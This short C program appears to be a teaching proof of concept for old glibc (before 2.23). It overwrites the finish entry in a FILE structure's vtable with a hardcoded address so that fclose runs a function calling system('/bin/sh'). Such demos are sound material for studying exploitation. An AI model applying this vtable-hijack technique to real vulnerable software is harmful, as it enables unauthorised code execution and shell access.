//libc < 2.23

#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void pwn()
{
	system("/bin/sh");
}
int main()
{
	FILE *fp=fopen("123.txt","r");
	printf("fp @ %p.\n",fp);
	unsigned long *vtableptr=(unsigned long *)*(unsigned long *)((char *)fp+0xd8);
	printf("vtableptr @ %p.\n",vtableptr);
	unsigned long *iofinishptr=(unsigned long *)*(vtableptr+2);
	printf("iofinish entry in vtable = %p.\n",iofinishptr);
	*(vtableptr+2)=0x400606;		
	printf("iofinish entry in vtable = %p.\n",(unsigned long *)*(vtableptr+2));
	fclose(fp);
}
